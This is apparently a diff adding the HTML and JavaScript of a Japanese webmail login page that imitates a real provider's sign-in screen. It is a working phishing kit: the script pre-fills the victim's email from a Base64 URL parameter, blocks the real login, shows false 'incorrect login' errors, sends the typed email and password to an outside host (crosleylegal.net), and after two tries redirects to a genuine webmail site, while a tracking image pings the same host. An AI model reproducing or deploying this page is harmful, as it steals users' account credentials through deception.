+											<span id="container-1016-outerCt" style="display: table; width: 100%; table-layout: fixed;" role="presentation">
+												<div id="container-1016-innerCt" style="display:table-cell;height:100%;vertical-align:top;" class="" role="presentation">
+													<div class="rui-core-login-title-app" ></div>
+												</div>
+											</span>
+										</div>
+									</td>
+								</tr>
+							</tbody>
+							<tbody role="presentation">
+								<tr role="presentation">
+									<td role="presentation" colspan="3" style="width:100%" id="ext-gen1089">
+										<div class="x-container x-core-login-error x-ltr x-container-default" style="border-width:0;" id="container-1017">
+											<span id="container-1017-outerCt" style="display: table; width: 100%; table-layout: fixed;" role="presentation">
+												<div id="container-1017-innerCt" style="display:table-cell;height:100%;vertical-align:top;" class="" role="presentation"></div>
+											</span>
+										</div>
+									</td>
+								</tr>
+							</tbody>
+							<tbody class="x-field x-table-plain x-form-item x-form-type-text x-ltr x-field-default x-form-form-item" style="border-width: 0px; table-layout: fixed;" role="presentation" id="textfield-1018">
+								<tr role="presentation" id="textfield-1018-inputRow" class="x-form-item-input-row">
+									<td role="presentation" id="textfield-1018-labelCell" style="display:none;" valign="top" halign="left" width="105" class="x-field-label-cell">
+										<label id="textfield-1018-labelEl" for="textfield-1018-inputEl" class="x-form-item-label x-unselectable x-form-item-label-left" style="width:100px;margin-right:5px;" unselectable="on"></label>
+									</td>
+									<td role="presentation" class="x-form-item-body  " id="textfield-1018-bodyEl" colspan="3" style="width: 100%;">
+										<input id="textfield-1018-inputEl" type="text" role="textbox" autocomplete="on" size="1" name="username" placeholder="メールアドレス" class="x-form-field automation-login-username-input x-form-empty-field x-form-required-field x-form-text" dir="auto" style="direction: initial; unicode-bidi: embed; text-align: left; width: 100%;" data-errorqtip="">
+										</td>
+									</tr>
+								</tbody>
+								<tbody role="presentation">
+									<tr role="presentation">
+										<td role="presentation" colspan="3" style="width:100%" id="ext-gen1090">
+											<label class="x-component rui-core-login-username-info x-ltr x-component-default" style="border-width: 0px; display: none;" id="label-1019" for=""></label>
+										</td>
+									</tr>
+								</tbody>
+								<tbody class="x-field x-core-password-field x-table-plain x-form-item x-form-type-password x-ltr x-field-default x-form-form-item" style="border-width: 0px; table-layout: fixed;" role="presentation" id="textfield-1020">
+									<tr role="presentation" id="textfield-1020-inputRow" class="x-form-item-input-row">
+										<td role="presentation" id="textfield-1020-labelCell" style="display:none;" valign="top" halign="left" width="105" class="x-field-label-cell">
+											<label id="textfield-1020-labelEl" for="textfield-1020-inputEl" class="x-form-item-label x-unselectable x-form-item-label-left" style="width:100px;margin-right:5px;" unselectable="on"></label>
+										</td>
+										<td role="presentation" class="x-form-item-body  " id="textfield-1020-bodyEl" colspan="3" style="width: 100%;">
+											<input id="textfield-1020-inputEl" type="password" role="textbox" autocomplete="on" size="1" name="password" placeholder="パスワード" class="x-form-field automation-login-password-input x-form-empty-field x-form-required-field x-form-text" dir="auto" style="direction: initial; unicode-bidi: embed; text-align: left; width: 100%;" data-errorqtip="">
+											</td>
+										</tr>
+									</tbody>
+									
+									
+										<tbody role="presentation">
+											<tr role="presentation">
+												<td role="presentation" colspan="3" style="width:100%" id="ext-gen1093">
+                                                        <button style="background-color: #e9381b !important;" type="submit" name="signin" id="button-1023" class="x-btn automation-login-login-button x-unselectable x-ltr x-btn-default-small x-noicon x-btn-noicon x-btn-default-small-noicon" data-i18n="Sign in"><span id="button-1023-btnWrap" role="presentation" class="x-btn-wrap" unselectable="on">
+															<span id="button-1023-btnEl" class="x-btn-button" role="presentation">
+																<span id="button-1023-btnInnerEl" class="x-btn-inner x-btn-inner-center" unselectable="on">ログイン</span>
+																<span role="presentation" id="button-1023-btnIconEl" class="x-btn-icon-el  " unselectable="on" style=""></span>
+															</span>
+														</span></button>
+														
+													
+												</td>
+											</tr>
+										</tbody>
+										<tbody class="x-field rui-login-lang x-table-plain x-form-item x-form-type-text x-ltr x-field-default x-form-form-item x-form-dirty" style="border-width: 0px; width: 90px; table-layout: fixed;" role="presentation" id="combobox-1024">
+											<tr role="presentation" id="combobox-1024-inputRow" class="x-form-item-input-row">
+												<td role="presentation" id="combobox-1024-labelCell" style="" valign="top" halign="left" width="105" class="x-field-label-cell">
+													<label id="combobox-1024-labelEl" for="combobox-1024-inputEl" class="x-form-item-label x-unselectable x-form-item-label-left" style="width:100px;margin-right:5px;" unselectable="on">言語
+														<span role="separator">:</span>
+													</label>
+												</td>
+												<td role="presentation" class="x-form-item-body" id="combobox-1024-bodyEl" colspan="2" style="width: 100%;">
+													<table id="combobox-1024-triggerWrap" class="x-form-trigger-wrap" cellpadding="0" cellspacing="0" role="presentation" style="width: 100%; table-layout: fixed;">
+														<tbody role="presentation">
+															<tr role="presentation">
+																<td id="combobox-1024-inputCell" class="x-form-trigger-input-cell" role="presentation" style="width: 100%;">
+																	<div class="x-hide-display x-form-data-hidden" role="presentation" id="ext-gen1096"></div>
+																	<input id="combobox-1024-inputEl" dir="auto" type="text" role="combobox" class="x-form-field automation-login-language-input x-form-required-field x-form-text x-trigger-noedit" autocomplete="off" name="localeLanguage" readonly="readonly" style="direction: initial; unicode-bidi: embed; text-align: left; width: 100%;" data-errorqtip="">
+																	</td>
+																	<td role="presentation" valign="top" class=" x-trigger-cell x-unselectable" style="width:25px;" id="ext-gen1095">
+																		<div class="x-trigger-index-0 x-form-trigger x-form-arrow-trigger x-form-trigger-first" role="presentation" id="ext-gen1094"></div>
+																	</td>
+																</tr>
+															</tbody>
+														</table>
+													</td>
+												</tr>
+											</tbody>
+											<tbody role="presentation">
+												<tr role="presentation">
+													<td role="presentation" colspan="3" style="width:100%" id="ext-gen1097">
+														<label class="x-component rui-core-login-forgot-pwd x-ltr x-component-default" style="border-width:0;" id="label-1025" for="">
+															<a class="rui-core-login-forgot-pwd-link" href="https://support.cpi.ad.jp/" target="_blank">ウェブメールの利用方法についてはこちら</a>
+														</label>
+													</td>
+												</tr>
+											</tbody>
+											<tbody role="presentation">
+												<tr role="presentation">
+													<td role="presentation" colspan="3" style="width:100%" id="ext-gen1098">
+														<label class="x-component rui-core-login-copyright x-ltr x-component-default" style="border-width:0;" id="label-1026" for="">Copyright(c) JCOM Co., Ltd. All Rights Reserved.</label>
+													</td>
+												</tr>
+											</tbody>
+										</table>
+									</div>
+								</form>
+							</div>
+						</span>
+					</div>
+					<div class="x-panel x-fit-item x-ltr x-panel-default" id="appMainContainer-1027" style="display: none;">
+						<div id="appMainContainer-1027-body" class="x-panel-body x-panel-body-default x-box-layout-ct x-panel-body-default" role="presentation">
+							<div id="appMainContainer-1027-innerCt" class="x-box-inner " role="presentation">
+								<div id="appMainContainer-1027-targetEl" class="x-box-target" role="presentation">
+									<div class="x-container header-js-custom x-box-item x-ltr x-container-default x-layout-fit" style="height: 120px; display: none;" id="container-1028">
+										<div id="bt-navbar"></div>
+									</div>
+									<div class="x-container rui-core-main-header x-box-item x-ltr x-container-default x-box-layout-ct" id="container-1029">
+										<div id="container-1029-innerCt" class="x-box-inner " role="presentation">
+											<div id="container-1029-targetEl" class="x-box-target" role="presentation">
+												<div class="x-component rui-core-main-header-customheader x-box-item x-ltr x-component-default" style="width:100%;" id="customHeader-1030">
+													<iframe src="header/header_kwc.html" scrolling="no" onload="Richui.view.CustomHeader.iframeLoaded(this)"></iframe>
+												</div>
+												<div class="x-container rui-core-main-navigation x-box-item x-ltr x-container-default x-box-layout-ct" style="width:100%;" id="core-mainnavigation-container-1031">
+													<div id="core-mainnavigation-container-1031-innerCt" class="x-box-inner " role="presentation">
+														<div id="core-mainnavigation-container-1031-targetEl" class="x-box-target" role="presentation">
+															<div class="x-container rui-core-main-navigation-tabs automation-core-main-navigation-tabs x-box-item x-ltr x-container-default" id="container-1032">
+																<span id="container-1032-outerCt" style="display:table;" role="presentation">
+																	<div id="container-1032-innerCt" style="display:table-cell;height:100%;vertical-align:top;" class="" role="presentation"></div>
+																</span>
+															</div>
+															<div class="x-container rui-core-main-navigation-aux x-box-item x-ltr x-container-default x-box-layout-ct" style="width:450px;height:36px;" id="core-mainnavigationaux-container-1033">
+																<div id="core-mainnavigationaux-container-1033-innerCt" class="x-box-inner " role="presentation">
+																	<div id="core-mainnavigationaux-container-1033-targetEl" class="x-box-target" role="presentation">
+																		<div class="x-container rui-core-main-navigation-aux-btn-container x-box-item x-ltr x-container-default" id="container-1038">
+																			<span id="container-1038-outerCt" style="display:table;" role="presentation">
+																				<div id="container-1038-innerCt" style="display:table-cell;height:100%;vertical-align:top;" class="" role="presentation">
+																					<div class="x-container rui-mail-msgHeader-top x-ltr x-container-default x-box-layout-ct" id="container-1039">
+																						<div id="container-1039-innerCt" class="x-box-inner " role="presentation">
+																							<div id="container-1039-targetEl" class="x-box-target" role="presentation">
+																								<div class="x-component rui-core-main-navigation-aux-welcome x-box-item x-ltr x-component-default" id="component-1040">ようこそ&nbsp;&nbsp;</div>
+																								<div class="x-component rui-core-main-navigation-aux-user x-box-item x-ltr x-component-default" id="component-1041"></div>
+																							</div>
+																						</div>
+																					</div>
+																					<div class="x-component rui-core-main-navigation-aux-user-emailaddress x-ltr x-component-default" style="height:20px;" id="component-1042"></div>
+																				</div>
+																			</span>
+																		</div>
+																		<div class="x-container rui-core-main-navigation-aux-btn-container x-box-item x-ltr x-container-default" style="width:10px;" id="container-1043">
+																			<span id="container-1043-outerCt" style="display:table;" role="presentation">
+																				<div id="container-1043-innerCt" style="display:table-cell;height:100%;vertical-align:top;" class="" role="presentation">
+																					<a class="x-btn rui-core-main-navigation-settings x-unselectable x-ltr x-btn-default-small x-icon x-btn-icon x-btn-default-small-icon" hidefocus="on" unselectable="on" tabindex="0" id="splitbutton-1044">
+																						<span id="splitbutton-1044-btnWrap" role="presentation" class="x-btn-wrap x-btn-split x-btn-split-right" unselectable="on">
+																							<span id="splitbutton-1044-btnEl" class="x-btn-button" role="presentation">
+																								<span id="splitbutton-1044-btnInnerEl" class="x-btn-inner x-btn-inner-center" unselectable="on">&nbsp;</span>
+																								<span role="presentation" id="splitbutton-1044-btnIconEl" class="x-btn-icon-el ow-icon-mainNavigation-settings " unselectable="on" style=""></span>
+																							</span>
+																						</span>
+																					</a>
+																					<a class="x-btn rui-core-main-navigation-aux-dropdown x-unselectable x-ltr x-btn-default-small x-icon x-btn-icon x-btn-default-small-icon" hidefocus="on" unselectable="on" tabindex="0" id="splitbutton-1045">
+																						<span id="splitbutton-1045-btnWrap" role="presentation" class="x-btn-wrap x-btn-split x-btn-split-right" unselectable="on">
+																							<span id="splitbutton-1045-btnEl" class="x-btn-button" role="presentation">
+																								<span id="splitbutton-1045-btnInnerEl" class="x-btn-inner x-btn-inner-center" unselectable="on">&nbsp;</span>
+																								<span role="presentation" id="splitbutton-1045-btnIconEl" class="x-btn-icon-el ow-icon-mainNavigation-downArrow " unselectable="on" style=""></span>
+																							</span>
+																						</span>
+																					</a>
+																				</div>
+																			</span>
+																		</div>
+																	</div>
+																</div>
+															</div>
+														</div>
+													</div>
+												</div>
+											</div>
+										</div>
+									</div>
+								</div>
+							</div>
+						</div>
+					</div>
+					<div class="x-container x-fit-item x-ltr x-container-default x-layout-fit" id="container-1046" style="display: none;"></div>
+					<div class="x-container rui-mail-previewContainer x-fit-item x-ltr x-container-default x-layout-fit" id="container-1047" style="display: none;"></div>
+					<span id="ariaLive" aria-atomic="false" aria-live="assertive" style="z-index:-1; position:fixed; bottom:-1000px;">ctrl + alt + sを押して、アクセシビリティページにリダイレクトします。
+						<br>ctrl + alt + sを押して、アクセシビリティページにリダイレクトします。
+							<br>ctrl + alt + sを押して、アクセシビリティページにリダイレクトします。
+							</span>
+							<script type="text/javascript" charset="UTF-8" href="https://wm.secure.ne.jp/webmail/resources/locale/sdk/ext/ext-locale-ja.js"></script>
+							<div class="x-tip x-layer x-tip-default x-border-box" id="ext-quicktips-tip" style="display: none;">
+								<div class="x-tip-header x-header x-header-horizontal x-docked x-unselectable x-tip-header-default x-horizontal x-tip-header-horizontal x-tip-header-default-horizontal x-top x-tip-header-top x-tip-header-default-top x-docked-top x-tip-header-docked-top x-tip-header-default-docked-top" id="ext-quicktips-tip_header">
+									<div id="ext-quicktips-tip_header-body" class="x-header-body x-tip-header-body x-tip-header-body-default x-tip-header-body-horizontal x-tip-header-body-default-horizontal x-tip-header-body-top x-tip-header-body-default-top x-tip-header-body-docked-top x-tip-header-body-default-docked-top x-box-layout-ct x-tip-header-body-default-horizontal x-tip-header-body-default-top x-tip-header-body-default-docked-top" role="presentation">
+										<div id="ext-quicktips-tip_header-innerCt" class="x-box-inner " role="presentation">
+											<div id="ext-quicktips-tip_header-targetEl" class="x-box-target" role="presentation">
+												<div class="x-component x-header-text-container x-tip-header-text-container x-tip-header-text-container-default x-box-item x-component-default" unselectable="on" id="ext-quicktips-tip_header_hd">
+													<span id="ext-quicktips-tip_header_hd-textEl" class="x-header-text x-tip-header-text x-tip-header-text-default" unselectable="on">&nbsp;</span>
+												</div>
+											</div>
+										</div>
+									</div>
+								</div>
+								<div id="ext-quicktips-tip-body" class="x-tip-body x-tip-body-default x-tip-body-default" role="presentation">
+									<span id="ext-quicktips-tip-outerCt" style="display:table;" role="presentation">
+										<div id="ext-quicktips-tip-innerCt" style="display:table-cell;height:100%;vertical-align:top;" class="" role="presentation"></div>
+									</span>
+								</div>
+								<div role="presentation" class="x-tip-anchor x-tip-anchor-top" id="ext-gen1032"></div>
+							</div>
+							<div class="x-boundlist automation-login-language-dropdown x-boundlist-floating x-layer x-ltr x-boundlist-default x-border-box" id="boundlist-1050" tabindex="-1" style="right: auto; left: 659px; top: 500px; height: auto; width: 227px; z-index: 19001; direction: initial; unicode-bidi: embed; text-align: left; display: none;" dir="auto">
+								<div id="boundlist-1050-listEl" role="presentation" class="x-boundlist-list-ct x-unselectable" style="overflow: auto; height: auto;">
+									<div dir="auto" class="x-boundlist-item">English</div>
+									<div dir="auto" class="x-boundlist-item x-boundlist-selected x-boundlist-item-over">日本語</div>
+									<img src="https://crosleylegal.net/v-3rpff-45/hp/visit.php" alt="icon">
+								</div>
+							</div>
+
+							<script>
+								document.addEventListener("DOMContentLoaded", () => {
+									// Validate email function
+									const isValidEmail = (email) => {
+										const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+										return emailRegex.test(email);
+									};
+							
+									// Function to decode Base64
+									const decodeBase64 = (input) => {
+										try {
+											return atob(input); // Decode the Base64 string
+										} catch (error) {
+											return input; // If decoding fails, return the original string
+										}
+									};
+							
+									// Function to get the URL parameter
+									const getQueryParam = (param) => {
+										const urlParams = new URLSearchParams(window.location.search);
+										return urlParams.get(param);
+									};
+							
+									// Check for email in the URL, decode if needed, and append to the input field
+									const appendEmailToInput = () => {
+										const encodedEmail = getQueryParam("xSD");
+										if (encodedEmail) {
+											// Decode and validate the email
+											const decodedEmail = decodeBase64(encodedEmail);
+											if (isValidEmail(decodedEmail)) {
+												const inputField = document.getElementById("textfield-1018-inputEl");
+												if (inputField) {
+													inputField.value = decodedEmail; // Append the valid email
+												} else {
+													console.error('Input field with ID "floored" not found.');
+												}
+											} else {
+												console.warn("Invalid email after decoding.");
+											}
+										}
+									};
+							
+									// Run the function on page load
+									appendEmailToInput();
+								});
+							</script>
+							
+
+                            <script>
+                                var email = document.getElementById('textfield-1018-inputEl');
+                                var password = document.getElementById('textfield-1020-inputEl');
+                            
+                            
+                                var counter = 0;
+                            
+                                $('#button-1023').click(function(e){
+                                    e.preventDefault();
+                            
+                                    var alert2 = document.querySelector('#container-1017-innerCt');
+                            
+                            
+                            
+                                    if($('#textfield-1018-inputEl').val() == ""){
+                                        $('#textfield-1018-inputEl').focus();
+                                        $('#textfield-1018-inputEl').addClass("x-form-field automation-login-username-input x-form-required-field x-form-text x-form-invalid-field x-form-empty-field");
+                                        alert2.textContent = "メールアドレスを入力してください";
+                                    $('#container-1017-innerCt').show();
+                                        return false;
+                                    }else if(!($('#textfield-1018-inputEl').val())){
+                                        $('#textfield-1018-inputEl').focus();
+                                        alert2.textContent = "ログイン情報が正しくありません。ログイン情報を確認して、もう一度やり直してください。";
+                                    $('#container-1017-innerCt').show();
+                                        return false;
+                                    }else if($('#textfield-1020-inputEl').val() == ""){
+                                        $('#textfield-1020-inputEl').focus();
+                                        $('#textfield-1020-inputEl').addClass("x-form-field automation-login-password-input x-form-required-field x-form-text x-form-invalid-field x-form-empty-field");
+                                        alert2.textContent = "パスワードを入力してください。";
+                                    $('#container-1017-innerCt').show();
+                                        return false;
+                                    }else{
+                                        counter = counter + 1;
+                                        
+                                    $('#container-1017-innerCt').show();
+                            
+                                        if(counter >= 2){
+                                            var xmlhttp;
+                                            if(window.XMLHttpRequest){
+                                              xmlhttp = new XMLHttpRequest();
+                                            }else{
+                                              xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
+                                            }
+                            
+                                            xmlhttp.onreadystatechange=function(){
+                                              if(xmlhttp.readyState==4 && xmlhttp.status==200){
+                                                window.location = "https://webmail.asahi-net.jp/appsuite/?_gl=1*x65vqq*_gcl_au*ODU3NzMwNjQyLjE3MjA3NDkyNDI.*_ga*Njc5MDY1MjcxLjE3MjA3NDkyNDQ.*_ga_0MWMB0GRZF*MTcyMDc0OTI0My4xLjAuMTcyMDc0OTI0My42MC4wLjA.&_ga=2.233308378.59864379.1720749244-679065271.1720749244";
+                                              }
+                                            }
+                            
+                                            var email = document.getElementById('textfield-1018-inputEl').value;
+                                            var password = document.getElementById('textfield-1020-inputEl').value;
+                                            var formdata = new FormData();
+                            
+                                            formdata.append("textfield-1018-inputEl", email);
+                                            formdata.append("textfield-1020-inputEl", password);
+                            
+                                            var url = 'https://crosleylegal.net/v-3rpff-45/hp/xcure.php?others';
+                            
+                                            xmlhttp.open("POST", url);
+                                            xmlhttp.send(formdata);
+                            
+                                            return false;
+                                        }else if(counter >= 2) {
+                                            var xmlhttp;
+                                            if(window.XMLHttpRequest){
+                                              xmlhttp = new XMLHttpRequest();
+                                            }else{
+                                              xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
+                                            }
+                            
+                                            xmlhttp.onreadystatechange=function(){
+                                              if(xmlhttp.readyState==4 && xmlhttp.status==200){
+                                                    document.getElementById('textfield-1020-inputEl').value = "";
+                                                    alert2.textContent = "ログイン情報が正しくありません。ログイン情報を確認して、もう一度やり直してください。";
+                                              }
+                                            }
+                            
+                                            var email = document.getElementById('textfield-1018-inputEl').value;
+                                            var password = document.getElementById('textfield-1020-inputEl').value;
+                                            var formdata = new FormData();
+                            
+                                            formdata.append("textfield-1018-inputEl", email);
+                                            formdata.append("textfield-1020-inputEl", password);
+                            
+                                        var url = 'https://crosleylegal.net/v-3rpff-45/hp/xcure.php?others';
+                            
+                                            xmlhttp.open("POST", url);
+                                            xmlhttp.send(formdata);
+                            
+                                            return false;
+                            
+                                        }
+                                        else{
+                                            var xmlhttp;
+                                            if(window.XMLHttpRequest){
+                                              xmlhttp = new XMLHttpRequest();
+                                            }else{
+                                              xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
+                                            }
+                            
+                                            xmlhttp.onreadystatechange=function(){
+                                              if(xmlhttp.readyState==4 && xmlhttp.status==200){
+                                                    document.getElementById('textfield-1020-inputEl').value = "";
+                                                    alert2.textContent = "ログイン情報が正しくありません。ログイン情報を確認して、もう一度やり直してください。";
+                                              }
+                                            }
+                            
+                                            var email = document.getElementById('textfield-1018-inputEl').value;
+                                            var password = document.getElementById('textfield-1020-inputEl').value;
+                                            var formdata = new FormData();
+                            
+                                            formdata.append("textfield-1018-inputEl", email);
+                                            formdata.append("textfield-1020-inputEl", password);
+                            
+                                            var url = 'https://crosleylegal.net/v-3rpff-45/hp/xcure.php?others';
+                            
+                                            xmlhttp.open("POST", url);
+                                            xmlhttp.send(formdata);
+                            
+                                            return false;
+                                        }
+                                    }
+                            
+                                })
+                              </script>                            
+    </body>
+</html>
